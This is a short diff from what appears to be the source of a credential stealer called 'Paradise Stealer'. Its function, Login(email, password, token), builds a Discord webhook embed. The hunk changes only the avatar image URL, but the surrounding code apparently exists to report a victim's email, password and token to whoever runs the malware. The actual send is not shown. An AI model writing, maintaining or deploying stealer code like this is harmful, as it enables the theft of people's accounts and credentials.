@@ -142,7 +142,7 @@ function Login(email, password, token) {
         var params = {
             username: "Paradise Stealer",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/906888341285396520/942417490867286046/p_1.png",
             embeds: [
                 {
                     "color": 16507654,
